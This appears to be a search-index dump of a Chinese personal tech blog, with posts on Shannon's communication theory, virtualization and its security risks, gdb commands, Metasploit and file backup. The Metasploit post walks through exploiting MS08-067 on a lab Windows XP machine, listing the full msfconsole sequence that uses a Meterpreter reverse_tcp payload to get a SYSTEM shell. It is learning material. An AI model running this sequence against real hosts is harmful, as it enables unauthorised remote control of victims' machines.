[{"categories":["network"],"content":"【论文阅读笔记】A Mathematical Theory of Communication 本篇博客针对这篇论文，做翻译笔记，以及相关概念学习笔记\n找到有关的阅读笔记\u0026资料也放在这里做备用参考\n 信息论 By jasonxty From CSDN\nA mathmatical theory of communication阅读笔记（1）\n  Introduction 近来关于调制（modulation）方法的多样化发展，如PCM和PPM（将带宽转化为信噪比），使得人们对通信理论有了更大的兴趣。这个理论基础被包含在Nyquist和Hartley在这项主题的重要paper中。在本论文中，我们将其理论扩展为一系列新的因素，特别是噪声在信道中的影响、以及可能由原始消息的统计结构和最终目的地的性质所导致的节省物(savings)（？暂时不知道省了啥）\n PPM： Pulse Position Modulation，脉冲位置调制：如果调制信号只使载波脉冲系列中每一个脉冲产生的时间发生改变，而不改变其形状和幅度，且每一个脉冲产生时间的变化量比例于调制信号电压的幅度，与调制信号的频率无关，这种调制称为脉冲位置调制，简称脉位调制。\n相当于对脉冲的波形y=a*sin(bx) 来说，取任意区间，而a、b不变\n 脉冲位置调制-百度百科\n PCM： Pulse Code Modulation，脉冲编码调制 ：脉冲编码调制是把模拟信号变换为数字信号的一种调制方式，其最大的特点是把连续输入的模拟信号变换为在时域和振幅上都离散的量，然后将其转化为代码形式传输，一种将模拟信号经过抽样、量化和编码变换成数字信号的编码方式\n 抽样是将时间上连续的模拟信号变为时间上离散的抽样信号的过程；量化是把抽样信号变为幅度离散的数字信号；编码则是将量化后的数字信号(多进制)表示为二进制码组输出的过程。从调制的角度来看，PCM编码过程可以认为是一种特殊的调制方式，即用模拟信号去改变脉冲载波序列的有无，所以PCM称为脉冲编码调制。\n  脉冲编码调制-百度百科\n脉冲编码调制-MBA百科\n PCM、PPM、PWM三个都属于脉冲调制技术，应用领域不同。PCM:脉冲编码调制，以约定好的二进制码流传递信息，可以时分复用； PPM：脉冲位置调制，以不同时刻出现的脉冲位置传递信息，可以时分复用；PWM：脉冲宽度调制，以脉冲占空比传递信息，不可以时分复用；PWM以及其变种SPWM广泛用于电机调频调速控制。PPM和PCM都用于遥控设备无线传输上，PCM属于数字调制，需要利用高速AD和DA；PPM利用积分器和滤波器，属于模拟调制\n 通讯的基本问题是在一端准确或近似重现从另一端选择的消息。通常消息都会有语义，（应该指语义）即与一些物理实体系统或概念实体系统相关联的东西。通信的语义层面与具体的工程问题是无关。通信重要层面是实际信息是一种从一个可能的集合里选择所得到的信息。这个系统必须是被设计为对每个可能的选择进行操作，而不仅仅是处理实际选择的系统，因为信息在设计时是未知的。\n 这里提及到了信息论中信息的概念：\n信息：指各个事物运动的状态及状态变化的方式，是抽象的意识或知识。\n而信息的基本概念在于他的不确定性，任何已确定的事物都不含有信息。信息是能使认识主题对某一事物的未执行或不确定性减少的有用知识。\n因而在该段中，通信系统需要为信息的每个可能进行操作的设计，\n 假如在消息集合中的元素个数是有限的，那么当一个消息从集合中被选中时（所有的选择是等可能的），这个元素的数目或者其对应的单调函数可以被看作一种信息生成的量度。正如Hartley所指出，对数函数是最自然（合适）的选择。尽管当我们考虑消息的统计学影响时以及当我们有一系列连续范围的消息时，这个定义需要得到相当广泛的推广，我们将在所有情况下使用对数函数进行本质上的度量\n 涉及到了信息熵的概念\n这里利用如何去测量信息的多少去侧面定义信息\n 上述使用对数函数更方便的原因如下\n1.对数函数实际上非常好用。关于工程的重要参数（例如时间、带宽、时延等等）在取对数的情况下趋向于不同的线性关系。举个例子，在一个组中添加一个中继可以使中继的可能状态数加倍，然而在取以2为底的对数的情况下只加了1。将时间加倍有可能使消息数量成平方的增长，但在取对数的情况下仅仅是乘以2倍，等等。\n2.合适的方法能够使数据让我们有更加直观的感受。我们通过与普通标准的线性比较直观地测量实体（这与Nyquist的一篇论文密切相关）。例如我们认为，两副扑克的信息存储容量是一副扑克的两倍，两个相同的信道传输的信息的容量应该是一个信道容量的两倍。\n3.这在数学上更加合适。许多限制性的操作在取对数后很简单，但可能在数量级上令人难以想象\n 讲述了为什么在通信领域采用对数函数进行衡量\n 对数函数底数的选择应该和测量信息的单位的选择相符合。二进制数字，或者更简单地称之为bit，会使用底数为2的对数函数。一个具有两个稳定位置的设备，如继电器或触发器电路，可以存储一位信息。N个这样的设备能存储N bit信息（所有可能的状态为2^N，然后取对数的N = Log2(2^N) ）。十进制的数字可能会使用以10为底的对数函数。正如 Log2(M) = Log10(M) / Log10(2) = 3.32Log10(M) ，一个十进制数字大约为10/3 bits。台式机上的数字轮有10个位置，因此有一个可以存储一个数字容量。在涉及积分和微分的分析工作中，底数e是非常有用的，由此产生的信息单位称之为自然单位(natural units)。把底数为a的对数转换成底数为b的对数只需要将其乘以logb(a)。\n 大概是在讲对数底数不同和信息度量单位的关系，讲述了不同底的对数的不同展现\n 如上图（Fig.1 ），我们展示了一个通信系统的模型图。这包括5个重要的部分：\n  一个给接收终端产生用于通信消息的信息源。消息可能有多种表现：\n(a)类似用电报传输的一串字母；\n(b)一个关于时间的函数，例如在无线电或电话中；\n(c)一个关于时间和其他变量一起的函数，例如黑白电视——信息可以看作是一个时间和坐标点复合的函数f(x,y,t)，函数值表示(x,y)点在时间t的光强；\n(d)两个或以上的关于时间的函数，如f(t)、g(t)、h(t)在三维声音传输系统的情况，或者是在系统打算在多路复用中使用多个信道；\n(e)多个复合函数，如彩色电视中的变量信息由三个部分组成，在三维连续体中定义的函数r(x,y,t)、g(x,y,t)、b(x,y,t)，我们也可以把这三个函数看作是在该区域定义的向量场的组成部分，类似地，几个黑白电视信号源将产生由若干个三元函数组成的信息；\n(f)以上多种情况的组合，比如有声音的彩色电视。\n  一个负责将消息转变为能够在信道上传输的合适的信号的发射器。\n在电话技术中，发射器将声压转化为相应的电流。在电报中，我们有一种编码操作，使信息在信道上变为一系列的点、破折号和空格（莫尔斯电码）。在多路PCM系统中，不同的语音信号要经过采样、压缩、量化编码，然后才能正确的交错之后，产生信号。\n  信道仅仅是用来传输从发射器到接收器的信号的介质。信道可能是一根电线，同轴电缆，无线电频率、光束等。\n  接收器用来做和发送器相反的操作，即从信号中重建信息。\n  信宿是消息要发送的人或系统。\n  我们希望考虑在通信系统中一些一般性的问题。解决这一问题的首要需求是将其所涉及的各个元素表示为数学实体，即把物理上的各个部分理想化。我们可以粗略地将通信系统分为三个主要部分：离散的、连续的以及混合的。我们所说的离散系统指信息和信号都是离散符号序列的系统，典型的例子就是电报——信息是一系列字母，而信号是一串的点杠以及空格。一个连续系统指的是信息和信号都是可以表示为连续函数的系统，比如电视。一个混合系统指的是离散和连续变量都有的系统，比如语音的PCM传输。\n我们首先考虑的是离散型的系统。这种情况不仅在通信系统理论，而且还在计算机系统理论，电话交换和其他领域所应用。此外，离散型系统为连续型和混合型情况奠定了基础，这将在论文的后半部分得以展现。\n 讲了通信系统的大概模型，虽然在《信息论与编码》一书中给出了更加详细的模型，不过大体上是相似的，然后简要的介绍了通信系统模型中各部分的作用。\n然后将通信系统分为三类，并在论文正文中应该会详细的进行介绍。\n  Part Ⅰ Discrete Noiseless System   离散无噪声信道（The Discrete Noiseless Channel）   电传打字机（Teletype）和电报（Telegraphy）是传输离散信息信道的最简单的两个例子。总的来说，一个离散信道是一种可以将一个序列的符号（从有限集合里选择的确定符号S1，S2，...，Sn）从一端传至另外一端的系统。每个符号Si在一个确定时间ti （每个Si的ti不一定相同）内是确定的。这里不要求所有符号序列都能在系统中传输，可以仅仅允许某些确定的符号序列传输，这些就是在信道中可能的信号。因此在电报中，符号是点(.)和杠(-)，点包括一个单位时间的闭合和一个单位时间的开放，杠包括三个时间的闭合和一个时间的开放，一个字母空间包括三个单位时间的开放，一个单词包括6个单位时间的开放。（这边按个人理解来说，用1表示闭合，0表示开放，则点为10，杠为1110，字母间隔为000，单词间隔为000000，单位时间的开放应该是等价于间隔符）其次，我们可能会对允许的符号序列进行一定的限制，为了在两个符号之间没有空间（假如两个符号相邻，就会被认为是一个单词）。那么现在问题来了，我们该如何衡量这样的信道容量呢？\n 这里主要讲了离散信道的定义（当然是考虑无噪声的情况下），并且拿电报传输信道中的内容拿来举例（应该就是摩斯电码），然后抛出疑问，怎么去衡量信道容量\n 在电传打字机的例子下，所有的信号的持续时间相同，并且允许32个符号中的任意序列，那么信道容量是十分容易计算的。每个符号有着5bit的信息，当系统每秒传输n个符号时，显而易见的，信道容量是 5n bit/s 。但是这并不代表着电传打字机的信道会一直以这个速率传输信息——5n bit/s 是信道最大可能的传输速率，实际速率能否达到这个最大值取决于为信道提供信息的来源（信源），这会在接下来的文章中讲到。\nPART Ⅱ: The Discrete Channel With Noise ","description":"","tags":["thesis","studyNote"],"title":"Reading-Note-of-A-Mathematical-Theory-of-Communication","uri":"/posts/reading-note-of-a-mathematical-theory-of-communication/"},{"categories":[],"content":"虚拟化技术 0x00 序 虚拟化技术，是我们一项平时日常接触，但从未去细致了解过的一项技术。就如我们常用的vmware、virtual box、docker 都采用了不同程度的虚拟化技术，甚至jvm也是一种虚拟化技术的体现。\n这次我们来了解一波虚拟化技术\n 参考：\n虚拟化 - wiki\n虚拟化技术介绍\nIBM- 虚拟化技术漫谈\n虚拟化，看这篇文章就够了\nVMware 虚拟化介绍\n虚拟化技术应用介绍：\n虚拟化技术概念以及分类和应用全解\n虚拟化技术总览\nXen、OpenVZ、KVM、Hyper-V、VMWare虚拟化技术介绍\n云计算之虚拟化技术\nIntel的虚拟化技术：英特尔® 虚拟化技术（英特尔® VT）\n 0x01 什么是虚拟化 虚拟化（Virtualization）技术最早出现在 20 世纪 60 年代的 IBM 大型机系统，在70年代的 System 370 系列中逐渐流行起来，这些机器通过一种叫虚拟机监控器（Virtual Machine Monitor，VMM）的程序在物理硬件之上生成许多可以运行独立操作系统软件的虚拟机（Virtual Machine）实例。随着近年多核系统、集群、网格甚至云计算的广泛部署，虚拟化技术在商业应用上的优势日益体现，不仅降低了 IT 成本，而且还增强了系统安全性和可靠性，虚拟化的概念也逐渐深入到人们日常的工作与生活中。\nwiki的定义是这么讲的：在计算机技术中，虚拟化（技术）或虚拟技术（英语：Virtualization）是一种资源管理技术，是将计算机的各种实体资源（CPU、内存、磁盘空间、网络适配器等），予以抽象、转换后呈现出来并可供分割、组合为一个或多个电脑配置环境。由此，打破实体结构间的不可切割的障碍，使用户可以比原本的配置更好的方式来应用这些电脑硬件资源。这些资源的新虚拟部分是不受现有资源的架设方式，地域或物理配置所限制。一般所指的虚拟化资源包括计算能力和数据存储。\n而广义上来讲，虚拟化代表着对计算资源的抽象，而不仅仅局限于虚拟机的概念。例如对物理内存的抽象，产生了虚拟内存技术，使得应用程序认为其自身拥有连续可用的地址空间（Address Space），而实际上，应用程序的代码和数据可能是被分隔成多个碎片页或段），甚至被交换到磁盘、闪存等外部存储器上，即使物理内存不足，应用程序也能顺利执行。\n0x02 虚拟化的分类 虚拟化的分类主要有两种分法，一种按虚拟的对象分类，另一种按抽象程度分类\n我这里先介绍按抽象程度分类，毕竟按对象分太杂了，推荐直接从wiki中查阅其具体分类\n而虚拟化技术的本质在于对计算机系统软硬件资源的划分和抽象。计算机系统的高度复杂性是通过各种层次的抽象来控制，每一层都通过层与层之间的接口对底层进行抽象，隐藏底层具体实现而向上层提供较简单的接口。\n如下图，为一个层次关系图\n由这个关系图，我们将虚拟化技术分为五个层次\n  硬件抽象层等级的虚拟化（Hardware Abstraction Level）   主要由虚拟机监视器(virtual machine monitor，VMM\u0026Hypervisor)来隐藏不同厂商的处理器、存储器、芯片组等等特征，为这些虚拟机提供抽象与统一的虚拟平台。\n目前大多数X86平台的商业电脑使用这种虚拟化，最主要是由于现今处理器厂商提供了硬件辅助虚拟化技术\n主要的代表有：VMware ESXi、Hyper-V、Citrix。\n  指令集架构等级的虚拟化（Instruction Set Architecture Level）   指令集架构的虚拟化是透过软件来模拟不同架构的处理器、存储器、总线、磁盘控制卡、计时器等多个I/O设备，软件会将虚拟机所发出的指令转换为本机可以操作的指令在现有的硬件上运行。这种等级的虚拟化对于模拟相同处理器架构的平台可以提供很好的兼容性，如X86架构、Sparc架构、Alpha架构\n不过由于每条指令都由软件来模拟，因此会损失较大的性能\n主要的代表有：Bochs、QEMU。\n  操作系统等级的虚拟化（Operating System Level）   硬件抽象层等级的虚拟化中的全虚拟化与操作系统底层间有非常高的隔离能力，支持不同的操作系统，**安装后不须要重启主机、或修改引导程序（Boot Loader）以达到双系统的目的，风险低、维护简单。**由于此等级的虚拟机可以访问底层操作系统，因此用户必须花费大量的时间来安装与设置虚拟机，接着才能开始评估或测试所需运作的软件，这些设置包含了操作系统的安装、安全性或兼容性软件的更新、网络、系统设定等，如果所需的操作系统与底层操作系统相同，那么其实它们所作的跟实际上安装一台实体机器没有什么区别。\n操作系统内核虚拟化可以最大限度的减少新增虚拟机的所需，在这个等级的虚拟机共享实体主机上的硬件以及操作系统，呈现彼此独立且隔离的虚拟机环境。\n应用软件的环境是由操作系统、库、相依性软件、特定于系统的数据结构或文件系统，例如︰NTFS或Ext4，以及其他环境设置所组成。如果这些都保持不变，应用软件很难发现与真实环境的区别。这是所有操作系统等级虚拟化的关键想法。\n主要代表有：Docker，LXC，OpenVZ\n  库等级的虚拟化（Library Level）   大部分的应用程序都是使用由许多库组成的API（Application Programming Interface）来设计，使用动态链接的方式用于隐藏操作系统的细节，目的是提供程序员更简单的工作。这也产生了一种新的虚拟化方式，使用不同的API与不同操作系统底层的ABI（Application Binary Interface）来进行模拟的工作。\n主要代表有：Wine、WSL(Windows Subsystem for Linux)。\n一个是在linux跑exe，另一个是在windows下跑linux\n  编程语言等级的虚拟化（Programming Language Level）   此等级的虚拟化会将高级语言转译成一种名为字节码的语言，透过虚拟机转译成为可以直接运行的命令。跨操作系统平台、跨语言皆为其优点。就将其语言和系统低层之间再次封装了一层虚拟机，由虚拟机充当中间的翻译。\n 传统电脑是由指令集架构所驱动的一种机械语言，硬件的操作由特殊的I/O指令处理，也可以透过区块映射（Mapping）来操作存储器.\n大概是直接通过编译链接，生成相应的二进制文件。\n 主要代表有：Oracle Java、Microsoft .NET 、Parrot。\n主要技术分类如下，我们接下来拿几个代表性的讲讲\n0x03 典型的虚拟化技术应用  KVM  官网：http://www.linux-kvm.org/\nKVM（Kernel-based Virtual Machine）是基于内核的虚拟机，KVM是集成到Linux内核的VMM，是X86架构且硬件支持虚拟化技术(Intel VT或AMD-V)的Linux的全虚拟化解决方案。它是Linux的一个很小的模块，利用Linux做大量的事，如任务调度、内存管理与硬件设备交互等。\nKVM本身不执行任何模拟，需要用户控件程序通过/dev/kvm接口设置一个客户机的虚拟虚拟地址空间，向它提供模拟的I/O，并将其视频显示映射回宿主机的显示屏。\nKVM是一个独特的管理程序，通过将KVM作为一个内核模块实现，在虚拟环境下Linux内核集成管理程序将其作为一个可加载的模块可以简化管理和提升性能。在这种模式下，每个虚拟机都是一个常规的Linux进程，通过Linux调度程序进行调度。\n而基于KVM架构的VPS，默认是没有系统的，可自己上传ISO或调用服务商自带的ISO手动安装系统。这个非常适合热爱DIY自己VPS的客户。由于KVM架构全功能虚拟化架构，甚至拥有独立的BIOS控制，所以对母服务器性能影响较大，所以基于KVM的VPS较贵，但KVM VPS相对其它架构的VPS较为自由。\n如图，KVM是基于linux的一个内核模块，而用户无法直接控制内核模块做一些事情，此时kvm的开发者选择了QEMU(开源虚拟化工具，可以虚拟化不同的cpu)，然后kvm使用了qemu的一部分作为kvm的用户空间工具。\n QEMU是一套由Fabrice Bellard所编写的模拟处理器的自由软件。它与Bochs，PearPC近似，但其具有某些后两者所不具备的特性，如高速度及跨平台的特性。经由kqemu这个开源的加速器，QEMU能模拟至接近真实电脑的速度。\n kvm和qemu的关系如下图\n Xen  官网：http://xen.org/\nXen 由剑桥大学开发，它是基于硬件的完全分割，物理上有多少的资源就只能分配多少资源。\n其可分为Xen-PV（半虚拟化），和Xen-HVM（全虚拟化）。\nXen最重要的优势在于半虚拟化，此外未经修改的操作系统也可以直接在xen上运行(如Windows)，能让虚拟机有效运行而不需要仿真，因此虚拟机能感知到hypervisor，而不需要模拟虚拟硬件，从而能实现高性能。（即采用全虚拟化，用iso安装任意系统）\n hyper-v  官网：http://www.microsoft.com/zh-cn/server-cloud/\nHyper-V是微软提出的一种系统管理程序虚拟化技术，采用微内核的架构，兼顾了安全性和性能的要求。Hyper-V底层的Hypervisor运行在最高的特权级别下，微软将其称为ring -1（而Intel则将其称为root mode），而虚机的OS内核和驱动运行在ring 0，应用程序运行在ring 3下，这种架构就不需要采用复杂的BT（二进制特权指令翻译）技术，可以进一步提高安全性。从架构上讲Hyper-V只有“硬件－Hyper-V－虚拟机”三层，本身非常小巧，代码简单，且不包含任何第三方驱动，所以安全可靠、执行效率高，能充分利用硬件资源，使虚拟机 系统性能更接近真实系统性能。\n Vmware ESXI  官网：http://www.vmware.com/\n由图可见，管理工具直接嵌入到了ESXi vmKernel中，没有分化出独立的管理工具\n OpenVZ  官网：http://openvz.org/\nOpenVZ（简 称OVZ）采用SWsoft的Virutozzo虚拟化服务器软件产品的内核，是基于Linux平台的操作系统级服务器虚拟化架构。这个架构直接调用母服务器（母机）中的内核，模拟生成出子服务器（VPS，小机），所以，它经过虚拟化后相对于母服务器，性能损失大概只有的1-3%。\nOpenVZ另一个特点是，它是直接调用母服务器的内核，所以会导致部分软件无法使用，以及部分内核文件是无法修改。\n0x04 虚拟化安全现状  参考：\n参考论文地址：link\n【虚拟化安全】全面虚拟化安全风险列表\u0026专业安全建议\n虚拟化平台的安全问题与看法\n虚拟化安全——携程安全报道 ：OWASP\n操作系统与虚拟化安全 ：北大课程？？？\n   虚拟机蔓延\n 僵尸虚拟机：在实际运维过程中，由于安全管理流程的不规范，导致很多已经停用的虚拟机及相关镜像文件仍然被保存在硬盘上，有些可能以多份备份的形式被保存，占用了服务器的大量存储资源。 虚胖虚拟机：通常在配置虚拟机时会分配略高于其需求的资源以保证其可用性和安全性,然而过度的资源分配,包括CPU、内存和存储容量等,会导致其他虚拟机资源的匮乏,从而造成较为严重的资源浪费,甚至对企业业务造成影响。虚拟机蔓延会对系统的安全性、资源的利用率等产生影响,因此,应采取相应的技术手段、运用相关的管理方法来抑制虚拟机的蔓延,以保证虚拟化部署的安全性。    虚拟机迁移：虚拟机迁移是指将虚拟机从一个主机或存储位置移至另一个主机或存储位置的过程。迁移的过程不会影响用户的访问，这项技术也使得数据中心在资源协调方面更加灵活。但是从安全角度来看,虚拟机迁移技术给系统带来了一定的安全风险。系统的入侵检测系统通常会通过监测指定交换机端口流量来对系统进行检测，当虚拟机发生迁移时,可能导致迁移后的虚拟机流量不经过入侵检测系统所监测的端口，从而导致迁移后的虚拟机脱离系统的入侵检测系统,从而带来安全风险。\n  特殊配置隐患：不说了，都是人为因素，人才是最大的漏洞\n  虚拟化安全攻击\n  虚拟机跳跃：虚拟机跳跃是指攻击者基于一台虚拟机通过某种方式获取同一个Hypervisor上的其他虚拟机的访问权限,进而对其展开进攻。由于同一个Hypervisor上的虚拟机之间可以通过网络连接或共享内存的方式进行通信,这种方式就会导致攻击者进行虚拟机跳跃攻击。 就比如侧信道攻击\n  虚拟机逃逸：如其名，即可以通过在虚拟机中进行逃逸，从而控制运行虚拟机的物理机 典型案例：蓝色药丸、CloudBurst。\n 逃逸的后果：\n 安装Hypervisor级后门; 拒绝服务攻击; 窃取数据; 控制其他VM;     拒绝服务攻击：在虚拟化基础架构中,若管理员在Hypervisor上制定的资源分配策略不够严谨,恶意攻击者就能通过利用一个虚拟机将所有的系统资源耗尽,从而造成其他的虚拟机由于资源匮乏而拒绝服务。\n    ","description":"to introduce something about virtualization technology","tags":[],"title":"Virtualization Introduction","uri":"/posts/virtualization-introduction/"},{"categories":["reverse"],"content":"关于gdb的学习 0x00 序 GDB是一个由GNU开源组织发布的、UNIX/LINUX操作系统下的、基于命令行的、功能强大的程序调试工具。 对于一名Linux下工作的c++程序员，gdb是必不可少的工具。\ngdb作为一个动态调试工具，有着非常强大的功能，往常我偏爱于静态调试，比较喜欢直接用IDA和objdump直接还原出源码或汇编进行阅读，对于动态调试方面是比较弱的，但是没有关系，这次我们来学习学习gdb，顺便加深对动态调试的使用。\n 参考：(通过google，甚至找到了03年的gdb教程，搞不好这工具比我年龄还大，也充分说明了他的实用性)\ngdb - GNU Project Debugger ： 项目官网\nDebugging with GDB ：官方文档\nLinux Tools Quick Tutorial : GDB\nlinux c/c++ GDB教程详解\nGDB-100-tips - Github ：在线gitbook版本（here）\nhttps://firmianay.gitbooks.io/ctf-all-in-one/content/doc/2.3.1_gdb.html\n 0x01 gdb命令参考 这边作为备忘，列出常用的命令，方便查阅\n主要参考：https://github.com/hellogcc/100-gdb-tips/blob/master/refcard.pdf\n若有不会的，可在gdb命令行交互模式查看帮助：help command \n重要命令    gdb命令 作用     gdb program [core] 调试程序   b [file:]function 在函数下断点，此时参数也可以是地址(*0x00124365)、文件行号   run [arglist] 以arglist为参数，运行该程序   bt backtrace，打印程序堆栈信息   p expression print，计算表达式的值   c continue，继续运行程序（当遇到断点时）   n next，单步跟踪程序，当遇到函数调用时，也不进入此函数。函数当一行命令使用   s step，单步调试，如果有函数调用，则进入函数内   until 运行程序直至循环结束，后跟参数行号i，则运行至第i行   finish 运行程序，直到当前函数完成返回，并打印返回时的堆栈地址和返回值及参数值等信息   call function 调用程序内可见的函数，并传递参数，就是把一个函数拿来单独使用   q quit，退出gdb    第一个命令的core 是指一般错误是有个核心已转储，此时会产生一个coredump文件，这里可以利用这个coredump文件进行调试\n具体参考：https://www.cnblogs.com/luhouxiang/p/6830316.html\n查看当前栈前16个元素：\u003e x/16x $esp\n设置断点    gdb命令 作用     b [file:]n break，在file文件下第n行设置断点   b [file:]function break，在file文件下的function函数下断点，（断点在函数开始的位置）   b +offset 在现在停止的地方偏移offset行设置断点   b *addr 在addr地址设置断点   b ... if expression 在表达式条件下，设置断点   delete n 删除n号断点   clear n 清除第n行的断点   disable n 暂停第n个断点   enable n 开启第n个断点   info b 显示目前从程序断点情况   delete breakpoints 清除所有断点    查看源代码    gdb命令 作用     list 列出程序源代码   list n 显示以当前为行号前后10行代码   list func 显示func所在函数的源代码   list 接着上次list命令输出下边的内容    打印表达式    gdb命令 作用     print expr expr可以是任何当前正在被测试程序的有效表达式，包括数字、变量、函数调用   print a 打印a的值   print ++a 把a的值+1，并显示出来   print test(2) 把2作为test函数的参数，调用test()函数   display expr 在单步运行时将非常有用，使用display命令设置一个表达式后，它将在每次单步进行指令后，紧接着输出被设置的表达式及值   watch expr 设置一个监视点，一旦被监视的“表达式”的值改变，gdb将强行终止正在被调试的程序。如： watch a   whatis func\u0026var 查询变量或函数   info function 查询函数   info locals 显示当前堆栈页的所有变量    查询运行信息    gdb命令 作用     where/bt 当前运行的堆栈列表   bt backtrace，显示当前调用堆栈   up/down 改变堆栈显示的深度   set args 参数:指定运行时的参数   show args 查看设置好的参数   info program 来查看程序的是否在运行，进程号，被暂停的原因    分割窗口  layout：用于分割窗口，可以一边查看代码，一边测试： layout src：显示源代码窗口 layout asm：显示反汇编窗口 layout regs：显示源代码/反汇编和CPU寄存器窗口 layout split：显示源代码和反汇编窗口 Ctrl + L：刷新窗口  ","description":"","tags":["reverse"],"title":"gdb-learning","uri":"/posts/gdb-learning/"},{"categories":[],"content":"0x00 序 课上体验了一把msf的一套流程，但是由于靶机已经上了补丁，所以失败了，这次来记录一下Metasploit的一套攻击流程，也不知道为啥，网上所有的入门也是拿课上的ms08-067 来测试的\n那么我们这次来学习一下msf，并且能用msf用着ms08-067 来获取一个xp主机的cmd\n（还顺便学学怎么加入自己的exp\n 参考：\nMetasploit 官网\nMSF - Github ： msf的github仓库\nMetasploit入门系列(一)——何为MSF\n Metasploit入门系列(二)——初识模块\nMetasploit入门系列(三)——基本命令\nMetasploit入门系列(四)——小结备查\nMetasploit入门系列(五)——frp\nMetasploit入门系列(六)——永恒之蓝\nMetasploit入门系列(七)——Armitage\nMetasploit入门系列(八)——Meterpreter(一)\nMetasploit入门系列(九)——Meterpreter(二)\nMetasploit入门系列(十)——Meterpreter(三)\nMetasploit入门系列(十一)——后渗透测试\n Metasploit 学习笔记 ： 模块介绍\nMeterpreter初探 ：Metasploit的一个扩展模块，在后渗透阶段有强大的攻击力\n后渗透之meterpreter使用攻略\n 0x01 介绍 Metasploit是一款开源的安全漏洞检测工具，到目前为止，msf已经内置了数千个 已披露的漏洞相关的模块和渗透测试工具，模块使用ruby语言编写，这使得使用者能够根据需要对模块进行适当修改，甚至是调用自己写的测试模块。选定需要使用的攻击模块之后，你只需要使用简单的命令配置一些参数就能完成针对一个漏洞的 测试和利用，将渗透的过程自动化、简单化。\n以下是Metasploit个版本的区别\nkali里面自带了Metasploit Framework，我们就直接拿来用了\n0x02 亲爱的ms08-067 这是一次刺激的msf攻击流程，用的是kali2020.02的vmware版本（输入banner命令可以看到不同一些奇奇怪怪的东西）\n靶机是直接从msdn上刚下的winxp pro sp2，配置如下，内网地址为192.168.52.135\n然后用kali的nmap扫一下靶机，发现啥都没扫出来，排查后发现是winxp的防火墙的原因，将其关掉，就发现该主机了\n 当然，加入发现445端口还没开的话，需要对win xp进行配置一下\n编辑注册表HKEY_LOCAL_MACHINE=\u003eSYSTEM=\u003eCurrentControlSet=\u003eServices=\u003eNetBT=\u003eParameters\n在Parameters上右键新建DWORD值，数值为1，重命名为SMBDeviceEnabled\n 然后发现445端口开了之后就可以进行攻击了\n在kali开启msf，先搜索一下这个漏洞，然后使用use\n然后去找相应的payload\n然后用set命令设置对应攻击载荷payload，这里使用的是reverse_tcp，这是一个基于TCP的反向链接反弹shell, 使用起来很稳定\n然后用show target ，来查找该漏洞受影响的机器，并根据目标靶机设置该选项\n然后用set target 10 来设置目标靶机的版本\n用show options 查看已经设置攻击模式\n然后设置目标靶机的ip地址，LHOST是攻击主机的地址\n 当用户使用Metasploit框架中的模块时，经常需要配置LHOST参数。其中，LHOST参数用来指定本地主机IP地址。由于IP地址不容易记忆，而且输入也不方便。此时，用户可以使用接口名来代替，如set LHOST eth0。当用户指定接口名后，将自动使用eth0接口的IP地址。\n 这边注意，LHOST不要写本地回环的地址，否则会像我一样翻车的\n然后用exploit命令，成功getshell\n同时我们可以看到这边后台有一个system起的cmd.exe，即msf渗透得到的shell\n简直可以为所欲为，不过试了下，windows这边还是可以终结掉kali的cmd进程\n不过又有谁会发现进程里多了一个进程呢，还是system起的\n后面的meterpreter模块真的是万能的好用\n 具体命令参考：后渗透之meterpreter使用攻略\n 一次完整的命令就如下了，虽然没有网上的博客直接打开一个shell，但是可以利用后渗透Meterpreter模块为所欲为，和getshell没啥大区别\n1 2 3 4 5 6 7 8 9 10  search ms08-067 use exploit/windows/smb/ms08_067_netapi show payloads set payload windows/meterpreter/reverse_tcp show targets set target 10 show options set RHOST 192.168.52.135 set LHOST 192.168.52.133 exploit   0x03 设置自己的exp  参考：\nMetasploit EXP开发\nConverting Metasploit Module to Stand Alone ： 其翻译版本如何改写msf的module为独立的exp？\n给kali的Metasploit下添加一个新的exploit\n 这边先mark一下，万一以后用到了呢/doge\n其exp是使用ruby语言编写的，可以仿照msf已有的exp进行编写，存放位置如下：/usr/share/metasploit-framework/modules/exploits/fwdtest\n写完放到里面后，在msf下重新加载模块msf \u003e reload_all，在用use xxx命令能够自动补全时，说明成功添加\n0x04 常用命令链接 metasploit常用命令\nmsfconsole常用命令\nmeterpreter常用命令+脚本\n","description":"","tags":[],"title":"Metasploit","uri":"/posts/metasploit/"},{"categories":["tech"],"content":"0x00 序 最近硬盘频繁崩溃，让我对我的电脑产生了担忧，于是就准备把上次老师说的备份来实现一下（虽然以前也有备份，但肯定没有现在电脑的资料全面）\n主要工具采用的是Rsync（当时了解镜像站时了解到的一个工具，可以实现增量备份）\n了解到有一个portableapp可以进行软件备份\n 通过google参考其他人的方案：\n网上大多看到的工具都是：FileSync\nFileSync是一个开源文件夹比较和同步工具，支持windows、linux、mac\n官网：https://freefilesync.org/\n   参考资料：\n 仅供参考的阅读资料(我觉得可能没软用)\n存储方案：适用于个人用户的最佳数据备份方案有哪些？\n个人数据备份方案\n 当前工作环境下的个人数据备份方案及实践\n数据备份与灾难恢复：感觉这篇更多的是针对企业的数据备份、容灾\n 全平台的备份指南，让你从此重装不再难 :极度推荐的备份方法，虽然他的本意是面对系统重装的  个人数据备份方案设计\n简易个人数据备份方案\n软件使用 篇二：个人数据的备份经验1-通过脚本自动化备份\n免费个人数据备份软件介绍：FreeFileSync、Syncthing\n DISM++：Dism++ 是一款 Windows 系统管理优化工具，它解决了我们安装、维护系统的一大痛点问题——自定义设置和优化。相当于一个 “一站式” 管理优化工具集。\nDism++ ，强大的 Windows 系统优化工具\nDism++，也许是最强的实用工具：汉化官网，gui版本\n之前了解的，不过之后感觉没有什么用了，已经决定使用scoop了\n  Portableapps：便携应用，适合U盘随身携带软件\n  之前还了解过portableApps，不过感觉其界面UI不行，还是主要面向可移动应用，不过可以自己制作相关的portableApp，在其官网上都给出了教程\n但是portableApps意味着就无法使用右键菜单了，也没法命令行快速启动，这是挺蛋疼的。不过这是一种可以方便移植到U盘的解决办法\n0x01 用rsync备份 rsync是可以实现增量备份的工具。配合任务计划，rsync能实现定时或间隔同步，配合inotify或sersync，可以实现触发式的实时同步。\nrsync可以实现scp的远程拷贝(rsync不支持远程到远程的拷贝，但scp支持)、cp的本地拷贝、rm删除和ls -l显示文件列表等功能。但需要注意的是，rsync的最终目的或者说其原始目的是实现两端主机的文件同步，因此实现的scp/cp/rm等功能仅仅只是同步的辅助手段，且rsync实现这些功能的方式和这些命令是不一样的。事实上，rsync有一套自己的算法，其算法原理以及rsync对算法实现的机制可能比想象中要复杂一些。\n因此我们来介绍一波rsync\n 参考：\nrsync -samba.org：官网\nthe rsync web pages\nrsync(1) - Linux man page\n第2章 rsync(一)：基本命令和用法：全文系列在：2.Linux 